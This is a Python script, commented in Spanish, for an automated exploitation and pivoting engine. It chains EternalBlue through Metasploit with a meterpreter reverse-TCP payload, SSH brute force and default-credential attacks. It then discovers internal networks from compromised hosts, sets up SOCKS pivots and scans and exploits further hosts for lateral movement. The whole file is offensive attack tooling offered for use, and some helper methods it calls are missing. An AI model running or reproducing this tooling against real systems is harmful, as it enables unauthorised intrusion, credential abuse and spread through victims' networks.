#!/usr/bin/env python3
"""
Automated Exploitation and Pivoting Engine
Motor automatizado de explotación con capacidades de pivoting
y descubrimiento de nuevas redes
"""

import asyncio
import json
import subprocess
import socket
import struct
import ipaddress
from typing import Dict, List, Tuple, Any
import paramiko
import requests
from pymetasploit3.msfrpc import MsfRpcClient
import netifaces
import scapy.all as scapy

class AutoExploitPivot:
    def __init__(self, enum_results: dict, config: dict):
        self.enum_results = enum_results
        self.config = config
        self.exploited_hosts = []
        self.discovered_networks = []
        self.pivot_points = []
        self.msf_client = None
        self.sessions = {}
        
    async def initialize(self):
        """Inicializar conexión con Metasploit"""
        try:
            self.msf_client = MsfRpcClient(
                self.config.get('msf_password', 'msf'),
                port=self.config.get('msf_port', 55553)
            )
        except:
            print("[!] No se pudo conectar a Metasploit RPC")
            
    async def execute_exploitation_chain(self) -> Dict[str, Any]:
        """Ejecutar cadena completa de explotación y pivoting"""
        results = {
            "exploited_hosts": [],
            "pivot_chains": [],
            "discovered_networks": [],
            "lateral_movements": []
        }
        
        # Fase 1: Explotación inicial de hosts descubiertos
        print("[*] Fase 1: Explotación inicial")
        for host, services in self.enum_results.items():
            exploit_result = await self.exploit_host(host, services)
            if exploit_result['success']:
                results["exploited_hosts"].append(exploit_result)
                self.exploited_hosts.append(host)
                
        # Fase 2: Descubrimiento de nuevas redes desde hosts comprometidos
        print("[*] Fase 2: Descubrimiento de redes")
        for host in self.exploited_hosts:
            networks = await self.discover_networks_from_host(host)
            for network in networks:
                if network not in self.discovered_networks:
                    self.discovered_networks.append(network)
                    results["discovered_networks"].append(network)
                    
        # Fase 3: Establecer pivoting
        print("[*] Fase 3: Estableciendo pivoting")
        for host in self.exploited_hosts:
            pivot_result = await self.setup_pivot(host)
            if pivot_result['success']:
                self.pivot_points.append(pivot_result)
                results["pivot_chains"].append(pivot_result)
                
        # Fase 4: Escanear y explotar hosts en nuevas redes
        print("[*] Fase 4: Explotación en redes pivotadas")
        for network in self.discovered_networks:
            new_hosts = await self.scan_pivoted_network(network)
            for new_host in new_hosts:
                # Enumerar servicios en el nuevo host
                services = await self.enum_pivoted_host(new_host)
                # Intentar explotación
                exploit_result = await self.exploit_host(new_host, services, pivoted=True)
                if exploit_result['success']:
                    results["lateral_movements"].append(exploit_result)
                    
        return results
    
    async def exploit_host(self, host: str, services: dict, pivoted: bool = False) -> Dict[str, Any]:
        """Explotar un host específico basado en servicios descubiertos"""
        result = {
            "host": host,
            "success": False,
            "method": None,
            "session": None,
            "privileges": None
        }
        
        # Priorizar exploits según servicios
        exploit_methods = self.prioritize_exploits(services)
        
        for method in exploit_methods:
            print(f"[*] Intentando {method['name']} en {host}")
            
            if method['type'] == 'credential':
                success = await self.try_credential_attack(host, method)
            elif method['type'] == 'vulnerability':
                success = await self.try_vulnerability_exploit(host, method)
            elif method['type'] == 'web':
                success = await self.try_web_exploit(host, method)
                
            if success:
                result.update({
                    "success": True,
                    "method": method['name'],
                    "session": success.get('session'),
                    "privileges": success.get('privileges', 'user')
                })
                break
                
        return result
    
    def prioritize_exploits(self, services: dict) -> List[Dict]:
        """Priorizar métodos de explotación según servicios"""
        exploits = []
        
        for port, service_info in services.get('services', {}).items():
            service_name = service_info.get('name', '')
            version = service_info.get('version', '')
            
            # SSH con credenciales débiles
            if service_name == 'ssh':
                exploits.append({
                    'name': 'ssh_bruteforce',
                    'type': 'credential',
                    'port': int(port.split('/')[0]),
                    'priority': 1
                })
                
            # SMB vulnerabilities
            elif service_name in ['microsoft-ds', 'netbios-ssn']:
                if 'Windows 7' in version or 'Windows Server 2008' in version:
                    exploits.append({
                        'name': 'ms17_010_eternalblue',
                        'type': 'vulnerability',
                        'port': int(port.split('/')[0]),
                        'priority': 0
                    })
                    
            # Web vulnerabilities
            elif service_name in ['http', 'https']:
                web_info = service_info.get('web_info', {})
                technologies = web_info.get('technologies', [])
                
                if 'WordPress' in technologies:
                    exploits.append({
                        'name': 'wordpress_exploit',
                        'type': 'web',
                        'port': int(port.split('/')[0]),
                        'priority': 2
                    })
                    
            # Database services
            elif service_name in ['mysql', 'postgresql', 'mssql']:
                exploits.append({
                    'name': f'{service_name}_default_creds',
                    'type': 'credential',
                    'port': int(port.split('/')[0]),
                    'priority': 1
                })
                
        # Ordenar por prioridad
        return sorted(exploits, key=lambda x: x['priority'])
    
    async def try_vulnerability_exploit(self, host: str, method: dict) -> Dict:
        """Intentar exploit de vulnerabilidad conocida"""
        if not self.msf_client:
            return None
            
        try:
            if method['name'] == 'ms17_010_eternalblue':
                exploit = self.msf_client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
                exploit['RHOSTS'] = host
                exploit['RPORT'] = method['port']
                
                # Configurar payload
                payload = self.msf_client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
                payload['LHOST'] = self.get_local_ip()
                payload['LPORT'] = 4444
                
                # Ejecutar exploit
                result = self.msf_client.sessions.list
                exploit.execute(payload=payload)
                
                # Esperar sesión
                await asyncio.sleep(10)
                new_sessions = self.msf_client.sessions.list
                
                if len(new_sessions) > len(result):
                    session_id = list(new_sessions.keys())[-1]
                    return {
                        'session': session_id,
                        'type': 'meterpreter',
                        'privileges': self.check_privileges(session_id)
                    }
                    
        except Exception as e:
            print(f"[!] Error en exploit: {e}")
            
        return None
    
    async def discover_networks_from_host(self, host: str) -> List[str]:
        """Descubrir nuevas redes desde un host comprometido"""
        networks = []
        
        if host not in self.sessions:
            return networks
            
        session = self.sessions[host]
        
        try:
            # Ejecutar comandos de descubrimiento según el tipo de sesión
            if session['type'] == 'ssh':
                commands = [
                    "ip route show",
                    "ifconfig -a",
                    "cat /proc/net/route",
                    "netstat -rn"
                ]
                
                ssh_client = session['client']
                for cmd in commands:
                    stdin, stdout, stderr = ssh_client.exec_command(cmd)
                    output = stdout.read().decode()
                    
                    # Parsear output para encontrar redes
                    networks.extend(self.parse_network_info(output))
                    
            elif session['type'] == 'meterpreter':
                # Usar comandos de Meterpreter
                session_obj = self.msf_client.sessions.session(session['id'])
                
                # Obtener interfaces de red
                result = session_obj.run_cmd('ipconfig' if 'windows' in session_obj.info else 'ifconfig')
                networks.extend(self.parse_network_info(result))
                
                # Buscar configuraciones VPN
                vpn_check = session_obj.run_cmd('netsh interface show interface' if 'windows' in session_obj.info else 'ip link show')
                if 'vpn' in vpn_check.lower() or 'tun' in vpn_check.lower():
                    print(f"[+] Posible conexión VPN detectada en {host}")
                    
        except Exception as e:
            print(f"[!] Error descubriendo redes: {e}")
            
        return list(set(networks))
    
    def parse_network_info(self, output: str) -> List[str]:
        """Parsear información de red del output de comandos"""
        networks = []
        
        # Buscar patrones de direcciones IP y redes
        import re
        
        # Patrón para redes CIDR
        cidr_pattern = r'\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)/\\d{1,2}\\b'
        
        # Patrón para direcciones IP
        ip_pattern = r'\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b'
        
        # Buscar redes CIDR
        for match in re.finditer(cidr_pattern, output):
            network = match.group()
            if not self.is_local_network(network):
                networks.append(network)
                
        # Buscar IPs y deducir redes
        for match in re.finditer(ip_pattern, output):
            ip = match.group()
            try:
                # Deducir red /24
                network = str(ipaddress.ip_network(f"{ip}/24", strict=False))
                if not self.is_local_network(network):
                    networks.append(network)
            except:
                pass
                
        return networks
    
    def is_local_network(self, network: str) -> bool:
        """Verificar si es una red local o loopback"""
        local_networks = ['127.0.0.0/8', '169.254.0.0/16', '::1/128']
        
        try:
            net = ipaddress.ip_network(network)
            for local in local_networks:
                if net.overlaps(ipaddress.ip_network(local)):
                    return True
        except:
            pass
            
        return False
    
    async def setup_pivot(self, host: str) -> Dict[str, Any]:
        """Establecer pivoting a través de un host comprometido"""
        result = {
            "host": host,
            "success": False,
            "method": None,
            "tunnel": None
        }
        
        if host not in self.sessions:
            return result
            
        session = self.sessions[host]
        
        try:
            if session['type'] == 'meterpreter':
                # Usar autoroute de Metasploit
                session_obj = self.msf_client.sessions.session(session['id'])
                
                # Agregar rutas automáticamente
                for network in self.discovered_networks:
                    cmd = f"run autoroute -s {network}"
                    session_obj.run_cmd(cmd)
                    
                # Configurar SOCKS proxy
                aux = self.msf_client.modules.use('auxiliary', 'server/socks_proxy')
                aux['SRVPORT'] = 1080
                aux.execute()
                
                result.update({
                    "success": True,
                    "method": "metasploit_autoroute",
                    "tunnel": {"type": "socks", "port": 1080}
                })
                
            elif session['type'] == 'ssh':
                # Establecer túnel SSH dinámico
                ssh_client = session['client']
                transport = ssh_client.get_transport()
                
                # Crear SOCKS proxy a través de SSH
                local_port = 1081
                transport.request_port_forward('', local_port)
                
                result.update({
                    "success": True,
                    "method": "ssh_dynamic_forward",
                    "tunnel": {"type": "socks", "port": local_port}
                })
                
        except Exception as e:
            print(f"[!] Error estableciendo pivot: {e}")
            
        return result
    
    async def scan_pivoted_network(self, network: str) -> List[str]:
        """Escanear red a través de pivot"""
        hosts = []
        
        try:
            # Si tenemos un pivot activo, usar proxychains
            if self.pivot_points:
                pivot = self.pivot_points[0]
                
                if pivot['tunnel']['type'] == 'socks':
                    # Configurar proxychains
                    proxy_config = f"""
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 {pivot['tunnel']['port']}
"""
                    with open('/tmp/proxychains.conf', 'w') as f:
                        f.write(proxy_config)
                        
                    # Escanear con nmap a través de proxy
                    cmd = f"proxychains -f /tmp/proxychains.conf nmap -sT -Pn --top-ports 100 {network}"
                    result = subprocess.run(cmd.split(), capture_output=True, text=True)
                    
                    # Parsear hosts activos
                    for line in result.stdout.split('\\n'):
                        if 'Nmap scan report for' in line:
                            host = line.split()[-1]
                            hosts.append(host)
                            
        except Exception as e:
            print(f"[!] Error escaneando red pivotada: {e}")
            
        return hosts
    
    async def enum_pivoted_host(self, host: str) -> Dict[str, Any]:
        """Enumerar servicios en host a través de pivot"""
        services = {}
        
        try:
            if self.pivot_points:
                pivot = self.pivot_points[0]
                
                # Escaneo básico de puertos comunes
                common_ports = [21, 22, 23, 25, 80, 443, 445, 3389, 8080]
                
                for port in common_ports:
                    # Verificar puerto a través de SOCKS
                    if await self.check_port_through_proxy(host, port, pivot['tunnel']):
                        services[f"{port}/tcp"] = {
                            "state": "open",
                            "name": self.guess_service(port)
                        }
                        
        except Exception as e:
            print(f"[!] Error enumerando host pivotado: {e}")
            
        return {"services": services}
    
    async def check_port_through_proxy(self, host: str, port: int, tunnel: dict) -> bool:
        """Verificar si un puerto está abierto a través de proxy"""
        import socks
        
        try:
            # Configurar socket SOCKS
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", tunnel['port'])
            s.settimeout(5)
            
            result = s.connect_ex((host, port))
            s.close()
            
            return result == 0
            
        except:
            return False
    
    def guess_service(self, port: int) -> str:
        """Adivinar servicio basado en puerto"""
        common_services = {
            21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
            80: "http", 443: "https", 445: "microsoft-ds",
            3389: "ms-wbt-server", 8080: "http-proxy"
        }
        return common_services.get(port, "unknown")
    
    def get_local_ip(self) -> str:
        """Obtener IP local para reverse shells"""
        try:
            # Obtener IP de la interfaz principal
            gws = netifaces.gateways()
            default_iface = gws['default'][netifaces.AF_INET][1]
            addrs = netifaces.ifaddresses(default_iface)
            return addrs[netifaces.AF_INET][0]['addr']
        except:
            return "127.0.0.1"
    
    def check_privileges(self, session_id: str) -> str:
        """Verificar nivel de privilegios de una sesión"""
        try:
            session = self.msf_client.sessions.session(session_id)
            result = session.run_cmd('whoami')
            
            if 'root' in result or 'administrator' in result or 'system' in result:
                return 'admin'
            else:
                return 'user'
        except:
            return 'unknown'

# Función principal para integración
async def main(enum_file: str, config_file: str = "exploit-config.json"):
    # Cargar resultados de enumeración
    with open(enum_file, 'r') as f:
        enum_results = json.load(f)
        
    # Cargar configuración
    with open(config_file, 'r') as f:
        config = json.load(f)
        
    # Ejecutar motor de explotación
    engine = AutoExploitPivot(enum_results, config)
    await engine.initialize()
    
    results = await engine.execute_exploitation_chain()
    
    # Guardar resultados
    output_file = f"exploit_results_{enum_file.replace('.json', '_exploited.json')}"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
        
    print(f"[+] Resultados de explotación guardados en {output_file}")
    return results

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        asyncio.run(main(sys.argv[1]))
    else:
        print("Uso: python3 auto-exploit-pivot.py <enum_results.json>")
